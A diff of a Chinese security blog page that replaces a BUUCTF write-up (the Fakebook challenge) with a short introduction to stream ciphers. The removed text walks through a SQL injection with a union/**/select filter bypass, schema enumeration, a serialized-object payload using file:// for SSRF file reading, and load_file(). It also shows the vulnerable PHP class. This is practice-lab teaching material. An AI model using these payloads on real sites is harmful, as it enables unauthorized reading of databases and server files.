@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="buuctf练习：31-40, 计算机 网络安全 渗透测试">
+    <meta name="keywords" content="流密码, 计算机 网络安全 渗透测试">
     <meta name="description" content="本科 | 软件工程 | 网络安全">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>buuctf练习：31-40 | huhu</title>
+    <title>流密码 | huhu</title>
 
     <link rel="icon" type="image/jpeg" href="/medias/tx.jpg">
 
@@ -429,12 +429,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/img/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/img/25.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">buuctf练习：31-40</h1>
+                    <h1 class="description center-align post-title">流密码</h1>
                 </div>
             </div>
         </div>
@@ -555,8 +555,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/buu%E7%BB%83%E4%B9%A0/">
-                                <span class="chip bg-color">buu练习</span>
+                            <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/">
+                                <span class="chip bg-color">流密码</span>
                             </a>
                         
                     </div>
@@ -567,8 +567,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" class="post-category">
+                                密码学
                             </a>
                         
                     </div>
@@ -580,28 +580,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-03-27
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-14
+                    2022-03-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    959
+                    114
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    1 分
                 </div>
                 
 
@@ -619,96 +619,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="31-网鼎杯-2018-Fakebook"><a href="#31-网鼎杯-2018-Fakebook" class="headerlink" title="31.[网鼎杯 2018]Fakebook"></a>31.[网鼎杯 2018]Fakebook</h2><p>这个题考察的还是比较好的，细细研究一下。考察的主要是SQL注入，SSRF读取文件，union select知识点。</p>
-<p>首先随便注册个账号，这个博客必须是地址，好像有个<code>.</code>就行。然后就登陆进去了。这是可以看到用户名是可以点的，眼要好使😉：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040181.png"></p>
-<p>点进去进入到view.php就是自己的信息界面，但是发现后面有个参数，那就试试注入，<code>1'</code>出现报错就存在SQL注入，直接给出相关payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">2 order by 4 #
-2 union select 1,2,3,4# ——被过滤了东西显示 :no back~_~
-2 union/**/select 1,2,3,4 # 显示第二位
-2 union/**/select 1,database(),3,4 #  fakebook
-2 union/**/select 1,table_name,3,4 from information_schema.tables where table_schema='fakebook' #  ——users
-记住语法：from是在字段的后面！！！
-
-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users' #  ——返回no,username,passwd,data，就是自己注册的信息
-
-2 union/**/select 1,data,3,4 from users #     ：O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:5:"1.com";} 自己信息的序列化内容
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>注入到这里并没有什么flag，只有自己的信息，但是这个data是有用的。再从页面返回的内容找信息：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040183.png"></p>
-<p>发现存在<code>unserialize()</code>函数以及<code>getBlogContent()</code>函数，大致就可以猜到会有一个类<code>UserInfo</code>，把用户信息存储为一个对象，然后再进行序列化存储到data字段里。然后读取blog内容之前会先进行反序列化，然后调用对象的<code>getBlogContent()</code>函数。这里就可以猜测，如果我们要读取flag，可能试试利用这个读取函数，如果存在SSRF的话。</p>
-<p>这里其实就可以猜测存在flag.php，然根据上面的路径，构造如下试一试：</p>
-<pre class="line-numbers language-none"><code class="language-none">O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>那么payload就如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">2 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>查看源码确实得到了flag：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040184.png"></p>
-<p>其实这里存在运气，因为不确定flag在哪以及是否存在SSRF漏洞。这时可以试试diresearch扫描下目录，会发现robots.txt和flag.php，说明就在这个目录。同时打开robot.txt发现了类的源码：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-
-<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> getBlogContents <span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> isValidBlog <span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>可以发现<code>curl_exec()</code>导致ssrf漏洞，没有进行任何过滤。同时也发现了类的构造。然后payload是一样的。</p>
-<p>其实在使用：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>使用了mysql的union select特性，前面的文章讲过，在数据不存在时，会增加虚拟数据：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040185.png"></p>
-<p>这样我们才可以查询我们构造的，否则数据库里没有那个data，查也查不到的。</p>
-<p>最后看了别的师傅的wp，发现另一种简单的方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">2 union/**/select 1,user(),3,4 #  root@localhost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>查询数据库当前用户的身份，发现是root，然后就可以使用<code>load_file('/var/www/html/flag.php')</code>函数直接读取文件数据了！🤩</p>
-<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040186.png"></p>
-<h2 id="32-GXYCTF2019-BabyUpload"><a href="#32-GXYCTF2019-BabyUpload" class="headerlink" title="32.[GXYCTF2019]BabyUpload"></a>32.[GXYCTF2019]BabyUpload</h2><p>这个题重复了哈，和之前的26题 <a href="https://huhu-myh.github.io/posts/myh10012.html#toc-heading-6">[MRCTF2020]你传你🐎呢</a> 是一样的思路，解题都一样，就不多说咧。</p>
-<p>题目源码：<a target="_blank" rel="noopener" href="https://github.com/imagin-sch/GXY_CTF/tree/master/Web/babyupload">https://github.com/imagin-sch/GXY_CTF/tree/master/Web/babyupload</a></p>
-<hr>
-<p>题目逐渐加难，不冲不行咧🤪</p>
-<img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131042058.jpg" style="zoom:150%;">
+                <h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><h3 id="1、流密码的概念"><a href="#1、流密码的概念" class="headerlink" title="1、流密码的概念"></a>1、流密码的概念</h3><p>在密码学中，<strong>流密码</strong>（英语：<strong>Stream cipher</strong>），又译为<strong>流加密</strong>、<strong>资料流加密</strong>，是一种<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密</a>算法，加密和解密双方使用相同伪随机加密数据流（pseudo-random stream）作为<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a>，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a>数据每次与密钥数据流顺次对应加密，得到<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a>数据流。实践中数据通常是一个<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BD%8D">位</a>（bit）并用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%BC%82%E6%88%96">异或</a>（xor）操作加密。</p>
 
                 
             </div>
@@ -735,7 +646,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://huhu-myh.github.io/posts/myh10018.html">https://huhu-myh.github.io/posts/myh10018.html</a>
+                    <a href="https://huhu-myh.github.io/posts/myh10026.html">https://huhu-myh.github.io/posts/myh10026.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -773,8 +684,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/buu%E7%BB%83%E4%B9%A0/">
-                                    <span class="chip bg-color">buu练习</span>
+                                <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/">
+                                    <span class="chip bg-color">流密码</span>
                                 </a>
                             
                         </div>
@@ -1246,45 +1157,47 @@ new Valine({
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/myh10019.html">
+                <a href="/posts/myh10026.html">
                     <div class="card-image">
                         
-                        <img src="/medias/img/18.jpg" class="responsive-img" alt="Vscode配置PHP开发环境">
+                        <img src="/medias/img/25.jpg" class="responsive-img" alt="流密码">
                         
-                        <span class="card-title">Vscode配置PHP开发环境</span>
+                        <span class="card-title">流密码</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            讲一下Vscode配置PHP环境~。
+                            好好学一下流密码，学费了
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E8%BF%90%E7%BB%B4/" class="post-category">
-                                    运维
+                            <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" class="post-category">
+                                    密码学
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PHP/">
-                        <span class="chip bg-color">PHP</span>
+                    <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/">
+                        <span class="chip bg-color">流密码</span>
                     </a>
                     
                 </div>
@@ -1298,30 +1211,30 @@ new Valine({
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/myh10017.html">
+                <a href="/posts/myh10025.html">
                     <div class="card-image">
                         
-                        <img src="/medias/img/16.jpg" class="responsive-img" alt="Burp_suite安装使用">
+                        <img src="/medias/img/24.jpg" class="responsive-img" alt="基于MySQL大整数BIGINT溢出的SQL注入">
                         
-                        <span class="card-title">Burp_suite安装使用</span>
+                        <span class="card-title">基于MySQL大整数BIGINT溢出的SQL注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            介绍一下破解版的burp安装教程吧~。
+                            虎符CTF中的一道babySQL学习
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-25
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%B7%A5%E5%85%B7/" class="post-category">
-                                    工具
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
                                 </a>
                             
                             
@@ -1331,8 +1244,8 @@ new Valine({
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Burp-suite/">
-                        <span class="chip bg-color">Burp_suite</span>
+                    <a href="/tags/SQL/">
+                        <span class="chip bg-color">SQL</span>
                     </a>
                     
                 </div>
